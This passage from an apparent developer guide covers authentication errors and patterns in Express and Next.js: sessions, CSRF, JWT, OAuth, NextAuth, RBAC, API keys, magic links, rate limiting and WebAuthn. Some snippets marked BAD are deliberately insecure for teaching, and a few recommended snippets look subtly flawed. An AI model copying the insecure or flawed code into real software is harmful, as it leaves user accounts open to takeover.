    return res.status(401).json({ error: 'Invalid email or password' });
  }

  const valid = await bcrypt.compare(req.body.password, user.password);
  if (!valid) {
    return res.status(401).json({ error: 'Invalid email or password' });
  }

  // Login success...
});
```

The dummy hash prevents attackers from determining whether an email exists based on response timing. Always return the same error message for both "user not found" and "wrong password".

Passport.js 0.6+ calls `req.session.regenerate()` and `req.session.save()` internally, which some session stores or older express-session versions don't support.

```
TypeError: req.session.regenerate is not a function
    at SessionManager.logIn
```

**Fix: wrap the session methods:**
```typescript
import session from 'express-session';
import passport from 'passport';

app.use(session({ /* options */ }));
app.use(passport.initialize());
app.use(passport.session());

// Polyfill for compatibility
app.use((req, res, next) => {
  if (req.session && !req.session.regenerate) {
    req.session.regenerate = (cb: (err?: any) => void) => cb();
  }
  if (req.session && !req.session.save) {
    req.session.save = (cb: (err?: any) => void) => cb();
  }
  next();
});
```

**Or upgrade express-session:**
```bash
npm install express-session@latest
```

This commonly occurs when using custom session stores that don't implement the full session interface, or when using Passport.js with a non-Express framework adapter.

CSRF tokens tied to sessions become invalid when the session expires. Users who leave a form open past session timeout get a 403 on submission.

```
HTTP 403 Forbidden
{ "error": "CSRF token mismatch" }
// User had the form open for 30+ minutes, session expired
```

**Fix: handle gracefully on both server and client:**
```typescript
// Server: return a specific error code
app.use((err, req, res, next) => {
  if (err.code === 'EBADCSRFTOKEN') {
    return res.status(419).json({
      error: 'csrf_expired',
      message: 'Your session expired. Please refresh and try again.',
    });
  }
  next(err);
});

// Client: detect and refresh
async function submitForm(data: FormData) {
  const res = await fetch('/api/submit', { method: 'POST', body: data });
  if (res.status === 419) {
    // Refresh CSRF token and retry
    const { token } = await fetch('/api/csrf-token').then(r => r.json());
    data.set('_csrf', token);
    return fetch('/api/submit', { method: 'POST', body: data });
  }
  return res;
}
```

Alternative: use the synchronizer token pattern with tokens that are independent of the session, validated via HMAC with a server secret.

In Next.js App Router, `getServerSession` requires the auth options. Passing them incorrectly returns null even when the user is logged in.

```typescript
// BAD — Pages Router syntax in App Router
import { getServerSession } from 'next-auth';

export async function GET() {
  const session = await getServerSession(); // null! Missing authOptions
}

// GOOD — pass authOptions
import { getServerSession } from 'next-auth';
import { authOptions } from '@/lib/auth';

export async function GET() {
  const session = await getServerSession(authOptions);
  if (!session) return Response.json({ error: 'Unauthorized' }, { status: 401 });
  return Response.json({ user: session.user });
}

// In Pages Router API routes:
import type { NextApiRequest, NextApiResponse } from 'next';

export default async function handler(req: NextApiRequest, res: NextApiResponse) {
  const session = await getServerSession(req, res, authOptions); // All 3 args!
  if (!session) return res.status(401).json({ error: 'Unauthorized' });
}
```

In Pages Router, `getServerSession` requires `(req, res, authOptions)` — all three arguments. In App Router, it only needs `(authOptions)` but you must import and pass the options explicitly.

JWT libraries (especially `jose`) enforce minimum key sizes for HMAC algorithms. HS256 requires a 256-bit (32-byte) key.

```typescript
import * as jose from 'jose';

// Fails: key too short
const secret = new TextEncoder().encode('short-key');
await new jose.SignJWT({ sub: '123' })
  .setProtectedHeader({ alg: 'HS256' })
  .sign(secret);
// Error: secretOrPrivateKey has a minimum key size of 256 bits for HS256
```

**Fix: generate a proper-length secret:**
```bash
# Generate a 256-bit (32-byte) secret
openssl rand -base64 32
# Or for hex:
openssl rand -hex 32
```

```typescript
// Use the full-length secret
const secret = new TextEncoder().encode(
  process.env.JWT_SECRET // Must be >= 32 bytes for HS256
);

// Or generate programmatically:
import { generateSecret } from 'jose';
const secret = await generateSecret('HS256');
```

Minimum key sizes: HS256 = 256 bits (32 bytes), HS384 = 384 bits (48 bytes), HS512 = 512 bits (64 bytes). RSA keys need minimum 2048 bits.

The `invalid_grant` error during token exchange means the authorization code is either expired (typically 60 seconds), already exchanged, or the redirect_uri doesn't match.

```
POST /oauth/token
Response: { "error": "invalid_grant", "error_description": "Code has expired" }
```

**Common causes:**
```typescript
// Cause 1: Code used twice (e.g., React StrictMode double-renders in dev)
useEffect(() => {
  const code = searchParams.get('code');
  exchangeCodeForToken(code); // Called twice in StrictMode!
}, []);

// Fix: use a ref to prevent double exchange
const exchanged = useRef(false);
useEffect(() => {
  const code = searchParams.get('code');
  if (code && !exchanged.current) {
    exchanged.current = true;
    exchangeCodeForToken(code);
  }
}, []);

// Cause 2: redirect_uri mismatch between authorize and token requests
// The EXACT same redirect_uri must be used in both steps

// Cause 3: Code expired — exchange took too long
// Fix: exchange immediately upon receiving the code, don't wait for component mount
```

Authorization codes are single-use by design (RFC 6749). If a code is used twice, the provider should revoke all tokens issued from that code.

When validating JWTs from external providers (Auth0, Okta, Firebase), you must verify the `iss` (issuer) claim to prevent token substitution attacks.

```typescript
// BAD — no issuer verification
jwt.verify(token, secret); // Accepts tokens from any issuer!

// A token from a different tenant/app could be accepted

// GOOD — verify issuer and audience
jwt.verify(token, secret, {
  issuer: 'https://myapp.auth0.com/',
  audience: 'https://api.myapp.com',
  algorithms: ['RS256'],
});

// With jose library:
import * as jose from 'jose';

const { payload } = await jose.jwtVerify(token, publicKey, {
  issuer: 'https://myapp.auth0.com/',
  audience: 'https://api.myapp.com',
});

// For multi-tenant apps, validate against allowed issuers
const ALLOWED_ISSUERS = [
  'https://tenant1.auth0.com/',
  'https://tenant2.auth0.com/',
];

const decoded = jwt.decode(token, { complete: true });
if (!ALLOWED_ISSUERS.includes(decoded.payload.iss)) {
  throw new Error('Untrusted token issuer');
}
```

Always verify `iss`, `aud`, `exp`, and `alg`. In multi-tenant systems, ensure a token from tenant A cannot access tenant B's resources.

This happens when async auth middleware doesn't properly await before route handlers access `req.user`.

```typescript
// BAD — not awaiting the async middleware
function authMiddleware(req, res, next) {
  verifyToken(req.headers.authorization).then(user => {
    req.user = user;
  });
  next(); // Called before verifyToken resolves!
}

app.get('/profile', authMiddleware, (req, res) => {
  res.json({ id: req.user.id }); // TypeError: Cannot read properties of undefined
});

// GOOD — await or use callback properly
async function authMiddleware(req: Request, res: Response, next: NextFunction) {
  try {
    const token = req.headers.authorization?.split(' ')[1];
    if (!token) return res.status(401).json({ error: 'No token' });
    req.user = await verifyToken(token);
    next();
  } catch (err) {
    res.status(401).json({ error: 'Invalid token' });
  }
}
```

With Express 4, you need `express-async-errors` or manual try/catch. Express 5 handles async middleware natively. Always ensure `next()` is called after the async operation completes.

The argon2 `verify` function expects `(hash, password)` — the opposite order of bcrypt's `(password, hash)`. Swapping them gives a confusing error.

```typescript
import { hash, verify } from 'argon2';

const hashed = await hash('myPassword');

// BAD — bcrypt argument order
await verify('myPassword', hashed);
// Error: pHash is not a valid hash

// GOOD — argon2 argument order
await verify(hashed, 'myPassword'); // true

// Compare with bcrypt:
import bcrypt from 'bcrypt';
await bcrypt.compare('myPassword', hashed); // (password, hash) — opposite order!
```

Argon2: `verify(hash, plaintext)`. Bcrypt: `compare(plaintext, hash)`. This is one of the most common mistakes when migrating from bcrypt to argon2.

When the OAuth token exchange fails, some providers return an HTML error page instead of JSON, causing JSON.parse to fail.

```
SyntaxError: Unexpected token '<', "<!DOCTYPE "... is not valid JSON
```

```typescript
// BAD — assuming JSON response
const tokenRes = await fetch(tokenUrl, { method: 'POST', body: params });
const tokens = await tokenRes.json(); // Fails if provider returns HTML error

// GOOD — check content type and status
const tokenRes = await fetch(tokenUrl, {
  method: 'POST',
  headers: { 
    'Content-Type': 'application/x-www-form-urlencoded',
    'Accept': 'application/json', // Request JSON response
  },
  body: new URLSearchParams(params),
});

if (!tokenRes.ok) {
  const contentType = tokenRes.headers.get('content-type');
  if (contentType?.includes('text/html')) {
    throw new Error(`OAuth provider returned HTML error (${tokenRes.status}). Check client_id, client_secret, and redirect_uri.`);
  }
  const error = await tokenRes.json();
  throw new Error(`OAuth error: ${error.error} - ${error.error_description}`);
}

const tokens = await tokenRes.json();
```

This usually means your client_id or client_secret is wrong, or the token endpoint URL is incorrect. GitHub's OAuth also requires the `Accept: application/json` header or it returns `application/x-www-form-urlencoded`.

NextAuth v4 expects a specific export structure. Exporting the handler incorrectly causes cryptic destructuring errors.

```
TypeError: Cannot destructure property 'providers' of 'undefined'
```

**App Router (Next.js 13+):**
```typescript
// app/api/auth/[...nextauth]/route.ts
import NextAuth from 'next-auth';
import { authOptions } from '@/lib/auth'; // Separate file for reuse

const handler = NextAuth(authOptions);
export { handler as GET, handler as POST };
```

**Pages Router:**
```typescript
// pages/api/auth/[...nextauth].ts
import NextAuth from 'next-auth';
import type { NextAuthOptions } from 'next-auth';

export const authOptions: NextAuthOptions = {
  providers: [...],
  // ...
};

export default NextAuth(authOptions);
```

**Auth options in shared file:**
```typescript
// lib/auth.ts
import type { NextAuthOptions } from 'next-auth';
import GoogleProvider from 'next-auth/providers/google';

export const authOptions: NextAuthOptions = {
  providers: [
    GoogleProvider({
      clientId: process.env.GOOGLE_CLIENT_ID!,
      clientSecret: process.env.GOOGLE_CLIENT_SECRET!,
    }),
  ],
  secret: process.env.NEXTAUTH_SECRET,
};
```

Extract authOptions to a shared file so both route handlers and `getServerSession()` use the same configuration.

This error occurs when using an RSA public key to verify a token that was signed with an HMAC symmetric key (or vice versa).

```typescript
// Token signed with HMAC (symmetric)
const token = jwt.sign({ userId: '123' }, 'my-secret', { algorithm: 'HS256' });

// Trying to verify with RSA public key
const publicKey = fs.readFileSync('public.pem');
jwt.verify(token, publicKey, { algorithms: ['RS256'] });
// Error: header.alg must be RS256

// Fix: match the algorithm to the key type
// For HMAC (shared secret):
jwt.verify(token, 'my-secret', { algorithms: ['HS256'] });

// For RSA (public/private key pair):
const privateKey = fs.readFileSync('private.pem');
const token = jwt.sign({ userId: '123' }, privateKey, { algorithm: 'RS256' });
const publicKey = fs.readFileSync('public.pem');
jwt.verify(token, publicKey, { algorithms: ['RS256'] });
```

HS256 = symmetric (same secret for sign and verify). RS256 = asymmetric (private key signs, public key verifies). Use RS256 when the verifier shouldn't be able to create tokens (e.g., microservices architecture).

All existing sessions are invalidated when the session secret changes (e.g., auto-generated secret that changes on server restart).

```typescript
// BAD — generates new secret each deploy/restart
app.use(session({
  secret: crypto.randomBytes(32).toString('hex'), // New on every start!
  resave: false,
  saveUninitialized: false,
}));

// All users logged out after every deploy!

// GOOD — persistent secret from environment
app.use(session({
  secret: process.env.SESSION_SECRET!, // Same across deploys
  resave: false,
  saveUninitialized: false,
  store: new RedisStore({ client: redisClient }),
}));
```

Generate a stable session secret once and store it in your environment variables or secrets manager. For key rotation without session invalidation, pass an array of secrets — the first is used for signing, all are checked for verification:

```typescript
app.use(session({
  secret: [process.env.SESSION_SECRET_NEW!, process.env.SESSION_SECRET_OLD!],
}));
```

The TOTP secret must be in the same encoding format when generating the QR code and when verifying. Mixing base32 with hex or raw bytes causes silent verification failure.

```typescript
import { authenticator } from 'otplib';
import QRCode from 'qrcode';

// Generate secret
const secret = authenticator.generateSecret(); // base32 encoded

// BAD — storing hex but verifying against base32
await db.user.update({
  data: { totpSecret: Buffer.from(secret).toString('hex') }, // Hex!
});
// Later: authenticator.verify({ token, secret: user.totpSecret }); // Fails — not base32!

// GOOD — store as-is (base32)
await db.user.update({
  data: { totpSecret: secret }, // Already base32
});

// Generate QR code with otpauth URI
const otpauthUrl = authenticator.keyuri(user.email, 'MyApp', secret);
const qrCodeDataUrl = await QRCode.toDataURL(otpauthUrl);
// Send qrCodeDataUrl to frontend for display

// Verify
const isValid = authenticator.verify({ token: userCode, secret: user.totpSecret });
```

Always use `authenticator.generateSecret()` from otplib — it returns a properly formatted base32 string that works with authenticator apps (Google Authenticator, Authy, 1Password).

The standard pattern for web app authentication: short-lived access tokens for API authorization, long-lived refresh tokens for session continuity.

```typescript
// auth.ts — Token generation
import jwt from 'jsonwebtoken';

function generateTokens(userId: string, role: string) {
  const accessToken = jwt.sign(
    { sub: userId, role },
    process.env.ACCESS_TOKEN_SECRET!,
    { expiresIn: '15m' }
  );

  const refreshToken = jwt.sign(
    { sub: userId },
    process.env.REFRESH_TOKEN_SECRET!,
    { expiresIn: '7d' }
  );

  return { accessToken, refreshToken };
}

// Login route — set tokens as cookies
app.post('/auth/login', async (req, res) => {
  const user = await authenticateUser(req.body.email, req.body.password);
  if (!user) return res.status(401).json({ error: 'Invalid credentials' });

  const { accessToken, refreshToken } = generateTokens(user.id, user.role);

  // Store refresh token hash in DB for revocation
  await db.refreshToken.create({
    data: { userId: user.id, tokenHash: hashToken(refreshToken), expiresAt: addDays(7) },
  });

  res.cookie('access_token', accessToken, {
    httpOnly: true, secure: true, sameSite: 'strict', maxAge: 15 * 60 * 1000,
  });
  res.cookie('refresh_token', refreshToken, {
    httpOnly: true, secure: true, sameSite: 'strict', maxAge: 7 * 24 * 60 * 60 * 1000,
    path: '/auth/refresh', // Only sent to refresh endpoint
  });

  res.json({ user: { id: user.id, email: user.email, role: user.role } });
});

// Auth middleware
function authenticate(req: Request, res: Response, next: NextFunction) {
  const token = req.cookies.access_token;
  if (!token) return res.status(401).json({ error: 'No access token' });

  try {
    req.user = jwt.verify(token, process.env.ACCESS_TOKEN_SECRET!) as JwtPayload;
    next();
  } catch (err) {
    if (err instanceof jwt.TokenExpiredError) {
      return res.status(401).json({ error: 'token_expired' });
    }
    return res.status(401).json({ error: 'Invalid token' });
  }
}
```

Key design decisions: access token is short-lived (15m) so compromise has limited impact. Refresh token path is restricted to `/auth/refresh` so it's never sent to API endpoints. Refresh token hash is stored in DB for server-side revocation.

A composable middleware pattern for role-based authorization that works with any auth provider.

```typescript
// types.ts
type Role = 'admin' | 'editor' | 'viewer';

interface User {
  id: string;
  email: string;
  role: Role;
}

// middleware/authorize.ts
function authorize(...allowedRoles: Role[]) {
  return (req: Request, res: Response, next: NextFunction) => {
    if (!req.user) {
      return res.status(401).json({ error: 'Authentication required' });
    }

    if (!allowedRoles.includes(req.user.role)) {
      return res.status(403).json({
        error: 'Insufficient permissions',
        required: allowedRoles,
        current: req.user.role,
      });
    }

    next();
  };
}

// Usage
app.get('/api/users', authenticate, authorize('admin'), listUsers);
app.put('/api/posts/:id', authenticate, authorize('admin', 'editor'), updatePost);
app.get('/api/posts', authenticate, authorize('admin', 'editor', 'viewer'), listPosts);

// For more granular permissions:
type Permission = 'posts:read' | 'posts:write' | 'users:manage';

const ROLE_PERMISSIONS: Record<Role, Permission[]> = {
  admin: ['posts:read', 'posts:write', 'users:manage'],
  editor: ['posts:read', 'posts:write'],
  viewer: ['posts:read'],
};

function requirePermission(...permissions: Permission[]) {
  return (req: Request, res: Response, next: NextFunction) => {
    const userPerms = ROLE_PERMISSIONS[req.user!.role];
    const hasAll = permissions.every(p => userPerms.includes(p));
    if (!hasAll) return res.status(403).json({ error: 'Forbidden' });
    next();
  };
}

app.delete('/api/users/:id', authenticate, requirePermission('users:manage'), deleteUser);
```

The permission-based approach is more flexible than pure role checks — you can add new roles without modifying route definitions. Store the role-permission mapping in a database for runtime configuration.

Complete server-side OAuth implementation for a Next.js API route, handling the full authorization code flow.

```typescript
// app/api/auth/github/route.ts — Initiate OAuth
export async function GET() {
  const state = crypto.randomUUID();

  // Store state in a short-lived cookie for CSRF validation
  const url = new URL('https://github.com/login/oauth/authorize');
  url.searchParams.set('client_id', process.env.GITHUB_CLIENT_ID!);
  url.searchParams.set('redirect_uri', `${process.env.APP_URL}/api/auth/github/callback`);
  url.searchParams.set('state', state);
  url.searchParams.set('scope', 'read:user user:email');

  const response = NextResponse.redirect(url);
  response.cookies.set('oauth_state', state, {
    httpOnly: true, secure: true, sameSite: 'lax', maxAge: 600,
  });
  return response;
}

// app/api/auth/github/callback/route.ts — Handle callback
export async function GET(req: NextRequest) {
  const code = req.nextUrl.searchParams.get('code');
  const state = req.nextUrl.searchParams.get('state');
  const storedState = req.cookies.get('oauth_state')?.value;

  if (!code || !state || state !== storedState) {
    return NextResponse.redirect(new URL('/login?error=invalid_state', req.url));
  }

  // Exchange code for token (server-to-server)
  const tokenRes = await fetch('https://github.com/login/oauth/access_token', {
    method: 'POST',
    headers: { 'Accept': 'application/json', 'Content-Type': 'application/json' },
    body: JSON.stringify({
      client_id: process.env.GITHUB_CLIENT_ID,
      client_secret: process.env.GITHUB_CLIENT_SECRET,
      code,
      redirect_uri: `${process.env.APP_URL}/api/auth/github/callback`,
    }),
  });
  const { access_token } = await tokenRes.json();

  // Fetch user profile
  const userRes = await fetch('https://api.github.com/user', {
    headers: { Authorization: `Bearer ${access_token}` },
  });
  const githubUser = await userRes.json();

  // Create or update user, establish session
  const user = await upsertUser(githubUser);
  const session = await createSession(user.id);

  const response = NextResponse.redirect(new URL('/dashboard', req.url));
  response.cookies.set('session', session.token, {
    httpOnly: true, secure: true, sameSite: 'lax', maxAge: 7 * 24 * 60 * 60,
  });
  response.cookies.delete('oauth_state');
  return response;
}
```

The client secret never leaves the server. State validation prevents CSRF. The authorization code is exchanged immediately and only once. Token exchange happens server-to-server, invisible to the browser.

Next.js middleware only supports a single middleware function. Chain multiple auth checks using a compose pattern.

```typescript
// middleware.ts
import { NextRequest, NextResponse } from 'next/server';
import { jwtVerify } from 'jose';

type MiddlewareFn = (req: NextRequest) => Promise<NextResponse | null>;

async function chain(req: NextRequest, ...fns: MiddlewareFn[]): Promise<NextResponse> {
  for (const fn of fns) {
    const result = await fn(req);
    if (result) return result; // Short-circuit if middleware returns a response
  }
  return NextResponse.next();
}

// Auth check
async function requireAuth(req: NextRequest): Promise<NextResponse | null> {
  const token = req.cookies.get('access_token')?.value;
  if (!token) {
    return NextResponse.redirect(new URL('/login', req.url));
  }
  try {
    const secret = new TextEncoder().encode(process.env.JWT_SECRET!);
    const { payload } = await jwtVerify(token, secret);
    req.headers.set('x-user-id', payload.sub as string);
    req.headers.set('x-user-role', payload.role as string);
    return null; // Continue chain
  } catch {
    return NextResponse.redirect(new URL('/login', req.url));
  }
}

// Admin check
async function requireAdmin(req: NextRequest): Promise<NextResponse | null> {
  if (req.headers.get('x-user-role') !== 'admin') {
    return NextResponse.json({ error: 'Forbidden' }, { status: 403 });
  }
  return null;
}

export async function middleware(req: NextRequest) {
  const { pathname } = req.nextUrl;

  if (pathname.startsWith('/admin')) {
    return chain(req, requireAuth, requireAdmin);
  }
  if (pathname.startsWith('/dashboard')) {
    return chain(req, requireAuth);
  }
  return NextResponse.next();
}

export const config = {
  matcher: ['/dashboard/:path*', '/admin/:path*'],
};
```

Headers set in middleware are available in Server Components via `headers()`. The matcher config ensures middleware only runs on protected routes, not static assets.

Production API key system with prefix-based identification, scoped permissions, and automated rotation.

```typescript
import { createHash, randomBytes } from 'crypto';

// Generate API key with identifiable prefix
function generateApiKey(prefix: string = 'sk'): { key: string; hash: string } {
  const raw = randomBytes(32).toString('base64url');
  const key = `${prefix}_live_${raw}`; // sk_live_abc123...
  const hash = createHash('sha256').update(key).digest('hex');
  return { key, hash }; // Store hash, show key once to user
}

// API key model
interface ApiKey {
  id: string;
  hash: string;           // SHA-256 of the key
  prefix: string;         // First 8 chars for identification
  name: string;           // User-defined label
  scopes: string[];       // ['read:posts', 'write:posts']
  rateLimit: number;      // Requests per minute
  expiresAt: Date | null;
  lastUsedAt: Date | null;
  createdAt: Date;
}

// Middleware
async function apiKeyAuth(req: Request, res: Response, next: NextFunction) {
  const key = req.headers['x-api-key'] as string;
  if (!key) return res.status(401).json({ error: 'API key required' });

  const hash = createHash('sha256').update(key).digest('hex');
  const apiKey = await db.apiKey.findUnique({ where: { hash } });

  if (!apiKey || (apiKey.expiresAt && apiKey.expiresAt < new Date())) {
    return res.status(401).json({ error: 'Invalid or expired API key' });
  }

  // Check rate limit
  const usage = await rateLimiter.consume(`api_key:${apiKey.id}`, apiKey.rateLimit);
  if (!usage.allowed) {
    return res.status(429).json({ error: 'Rate limit exceeded', retryAfter: usage.retryAfter });
  }

  // Update last used (async, don't block response)
  db.apiKey.update({ where: { id: apiKey.id }, data: { lastUsedAt: new Date() } }).catch(() => {});

  req.apiKey = apiKey;
  next();
}

// Scope check
function requireScope(...scopes: string[]) {
  return (req: Request, res: Response, next: NextFunction) => {
    const hasScopes = scopes.every(s => req.apiKey!.scopes.includes(s));
    if (!hasScopes) return res.status(403).json({ error: 'Insufficient scope' });
    next();
  };
}

app.get('/api/posts', apiKeyAuth, requireScope('read:posts'), listPosts);
```

Never store API keys in plaintext — store a SHA-256 hash. Keep the first 8 characters (the prefix) for identification in dashboards. Use the `sk_live_`/`sk_test_` prefix convention (like Stripe) to prevent test keys in production.

Complete NextAuth.js configuration supporting multiple OAuth providers with automatic account linking and custom pages.

```typescript
// lib/auth.ts
import { NextAuthOptions } from 'next-auth';
import GoogleProvider from 'next-auth/providers/google';
import GitHubProvider from 'next-auth/providers/github';
import CredentialsProvider from 'next-auth/providers/credentials';
import { PrismaAdapter } from '@next-auth/prisma-adapter';
import { prisma } from '@/lib/prisma';
import { verify } from 'argon2';

export const authOptions: NextAuthOptions = {
  adapter: PrismaAdapter(prisma),
  session: { strategy: 'jwt' }, // Required when using Credentials provider
  pages: {
    signIn: '/login',
    error: '/login',
    newUser: '/onboarding',
  },
  providers: [
    GoogleProvider({
      clientId: process.env.GOOGLE_CLIENT_ID!,
      clientSecret: process.env.GOOGLE_CLIENT_SECRET!,
      allowDangerousEmailAccountLinking: true, // Link by verified email
    }),
    GitHubProvider({
      clientId: process.env.GITHUB_CLIENT_ID!,
      clientSecret: process.env.GITHUB_CLIENT_SECRET!,
      allowDangerousEmailAccountLinking: true,
    }),
    CredentialsProvider({
      name: 'credentials',
      credentials: {
        email: { label: 'Email', type: 'email' },
        password: { label: 'Password', type: 'password' },
      },
      async authorize(credentials) {
        if (!credentials?.email || !credentials?.password) return null;
        const user = await prisma.user.findUnique({ where: { email: credentials.email } });
        if (!user?.password) return null;
        const valid = await verify(user.password, credentials.password);
        return valid ? { id: user.id, email: user.email, name: user.name, role: user.role } : null;
      },
    }),
  ],
  callbacks: {
    async jwt({ token, user, trigger, session }) {
      if (user) { token.id = user.id; token.role = user.role; }
      if (trigger === 'update' && session) { token.role = session.role; }
      return token;
    },
    async session({ session, token }) {
      session.user.id = token.id as string;
      session.user.role = token.role as string;
      return session;
    },
  },
};
```

`allowDangerousEmailAccountLinking` auto-links OAuth accounts with matching emails. It's safe when providers verify emails (Google always does, GitHub check `email_verified`). The Credentials provider requires `session.strategy: 'jwt'` because it doesn't create a persistent session in the database.

Magic link auth eliminates passwords entirely. The user receives a one-time login link via email.

```typescript
import { createHash, randomBytes } from 'crypto';
import { sendEmail } from '@/lib/email';

// Request magic link
app.post('/auth/magic-link', async (req, res) => {
  const { email } = req.body;

  // Always return success to prevent user enumeration
  res.json({ message: 'If an account exists, a login link has been sent' });

  const user = await db.user.findUnique({ where: { email } });
  if (!user) return; // Don't reveal whether user exists

  const token = randomBytes(32).toString('hex');
  const hashedToken = createHash('sha256').update(token).digest('hex');

  await db.magicLink.create({
    data: {
      userId: user.id,
      token: hashedToken,
      expiresAt: new Date(Date.now() + 10 * 60 * 1000), // 10 minutes
    },
  });

  const loginUrl = `${process.env.APP_URL}/auth/verify?token=${token}`;
  await sendEmail({
    to: email,
    subject: 'Your login link',
    html: `<a href="${loginUrl}">Click to sign in</a><p>This link expires in 10 minutes.</p>`,
  });
});

// Verify magic link
app.get('/auth/verify', async (req, res) => {
  const { token } = req.query;
  const hashedToken = createHash('sha256').update(token as string).digest('hex');

  const magicLink = await db.magicLink.findFirst({
    where: { token: hashedToken, expiresAt: { gt: new Date() }, used: false },
    include: { user: true },
  });

  if (!magicLink) {
    return res.redirect('/login?error=invalid_or_expired_link');
  }

  // Mark as used and create session
  await db.magicLink.update({ where: { id: magicLink.id }, data: { used: true } });
  const session = await createSession(magicLink.user.id);

  res.cookie('session', session.token, {
    httpOnly: true, secure: true, sameSite: 'lax', maxAge: 30 * 24 * 60 * 60 * 1000,
  });
  res.redirect('/dashboard');
});
```

Magic links should be single-use, short-lived (10 minutes max), and hashed before storage. Rate limit the request endpoint to prevent email flooding. Consider adding a numeric code as an alternative for email clients that mangle URLs.

Instead of per-route middleware, define auth requirements declaratively in a route config.

```typescript
// auth-config.ts
interface RouteAuth {
  public?: boolean;
  roles?: string[];
  permissions?: string[];
}

const routeAuth: Record<string, RouteAuth> = {
  '/':                  { public: true },
  '/login':             { public: true },
  '/api/health':        { public: true },
  '/dashboard':         { roles: ['admin', 'editor', 'viewer'] },
  '/admin':             { roles: ['admin'] },
  '/api/posts':         { permissions: ['posts:read'] },
  '/api/users':         { permissions: ['users:manage'] },
};

// middleware.ts
export async function middleware(req: NextRequest) {
  const pathname = req.nextUrl.pathname;

  // Find matching route config (supports prefix matching)
  const auth = Object.entries(routeAuth)
    .filter(([route]) => pathname === route || pathname.startsWith(route + '/'))
    .sort(([a], [b]) => b.length - a.length)[0]?.[1]; // Most specific match

  if (!auth || auth.public) return NextResponse.next();

  const user = await getUser(req);
  if (!user) return NextResponse.redirect(new URL('/login', req.url));

  if (auth.roles && !auth.roles.includes(user.role)) {
    return NextResponse.json({ error: 'Forbidden' }, { status: 403 });
  }

  if (auth.permissions) {
    const userPerms = getUserPermissions(user.role);
    if (!auth.permissions.every(p => userPerms.includes(p))) {
      return NextResponse.json({ error: 'Forbidden' }, { status: 403 });
    }
  }

  return NextResponse.next();
}
```

This centralizes auth logic in one place instead of scattering middleware across routes. New routes default to requiring auth (secure by default). The config is easy to audit and test.

Instead of locking accounts (which enables denial-of-service), implement progressive delays that slow down attackers without blocking legitimate users.

```typescript
import { RateLimiterRedis } from 'rate-limiter-flexible';

const failedLoginLimiter = new RateLimiterRedis({
  storeClient: redisClient,
  keyPrefix: 'login_fail',
  points: 10,          // Allow 10 failed attempts
  duration: 60 * 60,   // Per hour
  blockDuration: 0,    // Don't block — we'll use progressive delays
});

async function getLoginDelay(email: string): number {
  const key = `login_delay:${email}`;
  const attempts = parseInt(await redis.get(key) || '0');

  // Progressive delay: 0, 1s, 2s, 4s, 8s, 16s, 30s max
  return Math.min(Math.pow(2, attempts) * 1000, 30000);
}

app.post('/login', async (req, res) => {
  const { email, password } = req.body;

  // Check if rate limited
  try {
    await failedLoginLimiter.consume(email);
  } catch {
    return res.status(429).json({
      error: 'Too many attempts. Try again later.',
    });
  }

  // Apply progressive delay
  const delay = await getLoginDelay(email);
  if (delay > 0) await new Promise(resolve => setTimeout(resolve, delay));

  const user = await db.user.findUnique({ where: { email } });
  if (!user || !(await verify(user.password, password))) {
    await redis.incr(`login_delay:${email}`);
    await redis.expire(`login_delay:${email}`, 3600);
    return res.status(401).json({ error: 'Invalid credentials' });
  }

  // Success — reset delay counter
  await redis.del(`login_delay:${email}`);
  await failedLoginLimiter.delete(email);

  // Issue tokens...
});
```

This approach slows brute force to a crawl while legitimate users (who get the password right in 1-2 attempts) barely notice. Hard lockout should only be used as a last resort, with admin notification.

Detect session hijacking by binding sessions to browser fingerprints and alerting on suspicious changes.

```typescript
import { createHash } from 'crypto';
import { UAParser } from 'ua-parser-js';

function generateFingerprint(req: Request): string {
  const ua = new UAParser(req.headers['user-agent']);
  const components = [
    ua.getBrowser().name,
    ua.getOS().name,
    req.headers['accept-language'],
    // Don't include IP — it changes legitimately (mobile, VPN)
  ].join('|');
  return createHash('sha256').update(components).digest('hex').slice(0, 16);
}

// On login — store fingerprint with session
async function createSession(userId: string, req: Request) {
  const token = crypto.randomBytes(32).toString('hex');
  const fingerprint = generateFingerprint(req);

  await db.session.create({
    data: {
      token: hashToken(token),
      userId,
      fingerprint,
      ip: req.ip,
      userAgent: req.headers['user-agent'],
      expiresAt: addDays(30),
    },
  });

  return token;
}

// Session validation middleware
async function validateSession(req: Request, res: Response, next: NextFunction) {
  const token = req.cookies.session;
  if (!token) return res.status(401).json({ error: 'No session' });

  const session = await db.session.findUnique({
    where: { token: hashToken(token), expiresAt: { gt: new Date() } },
    include: { user: true },
  });

  if (!session) return res.status(401).json({ error: 'Invalid session' });

  // Check fingerprint mismatch
  const currentFingerprint = generateFingerprint(req);
  if (currentFingerprint !== session.fingerprint) {
    // Possible hijacking — invalidate session and alert
    await db.session.delete({ where: { id: session.id } });
    await notifyUser(session.userId, 'Suspicious login detected');
    return res.status(401).json({ error: 'Session invalidated — please re-authenticate' });
  }

  req.user = session.user;
  next();
}
```

Don't include IP in the fingerprint — mobile users switch networks constantly. Browser + OS + language is stable enough to detect cross-device session theft without false positives.

WebAuthn enables passwordless authentication using hardware keys, biometrics, or device unlock.

```typescript
import {
  generateRegistrationOptions,
  verifyRegistrationResponse,
  generateAuthenticationOptions,
  verifyAuthenticationResponse,
} from '@simplewebauthn/server';

const rpName = 'My App';
const rpID = 'myapp.com';
const origin = 'https://myapp.com';

// Registration
app.post('/auth/webauthn/register/options', async (req, res) => {
  const user = req.user!;
  const existingKeys = await db.credential.findMany({ where: { userId: user.id } });

  const options = await generateRegistrationOptions({
    rpName,
    rpID,
    userID: user.id,
    userName: user.email,
    attestationType: 'none',
    excludeCredentials: existingKeys.map(k => ({
      id: k.credentialId,
      type: 'public-key',
    })),
    authenticatorSelection: {
      residentKey: 'preferred',    // Enable passkeys
      userVerification: 'preferred',
    },
  });

  req.session.webauthnChallenge = options.challenge;
  res.json(options);
});

app.post('/auth/webauthn/register/verify', async (req, res) => {
  const verification = await verifyRegistrationResponse({
    response: req.body,
    expectedChallenge: req.session.webauthnChallenge!,
    expectedOrigin: origin,
    expectedRPID: rpID,
  });

  if (verification.verified && verification.registrationInfo) {
    await db.credential.create({
      data: {
        userId: req.user!.id,
        credentialId: Buffer.from(verification.registrationInfo.credentialID),
        publicKey: Buffer.from(verification.registrationInfo.credentialPublicKey),
        counter: verification.registrationInfo.counter,
      },
    });
  }

  res.json({ verified: verification.verified });
});
```

Passkeys sync across devices via iCloud Keychain (Apple) or Google Password Manager. The `residentKey: 'preferred'` option enables discoverable credentials (the device remembers which accounts exist). WebAuthn is phishing-resistant because credentials are bound to the origin.

